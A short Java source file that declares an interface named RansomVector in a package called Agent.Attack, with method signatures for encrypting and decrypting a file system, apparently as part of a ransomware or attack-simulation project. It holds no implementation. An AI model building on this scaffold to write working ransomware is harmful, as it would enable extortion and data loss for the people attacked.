package Agent.Attack;

import Agent.exceptions.AttackVectorException;

public interface RansomVector {
	public void encryptFileSystem() throws AttackVectorException;

	public void decryptFileSystem() throws AttackVectorException;

}
